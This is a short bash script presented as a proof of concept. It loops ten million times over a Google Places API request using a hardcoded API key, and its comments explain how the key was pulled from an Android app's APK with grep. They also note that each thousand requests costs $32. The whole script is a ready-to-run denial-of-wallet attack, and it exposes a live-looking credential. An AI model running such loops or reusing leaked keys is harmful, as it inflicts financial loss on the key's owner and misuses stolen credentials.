
#!/bin/bash

for i in {1..10000000}; do
    status_code=$(curl -s -o /dev/null -w "%{http_code}" \
        'https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key=AIzaSyDKivq5v3R5ezDWsYAyRqaBSaKYJtlrTkM')
    echo "Request #$i - Status Code: $status_code"
done

# PoC:
# Download the APK file
# grep -aoE 'AIzaSy.{33}' co.mona.android.apk, then take the first one.
# curl -si 'https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key=AIzaSyDKivq5v3R5ezDWsYAyRqaBSaKYJtlrTkM'
# This is the request which costs $32 per 1000 request.
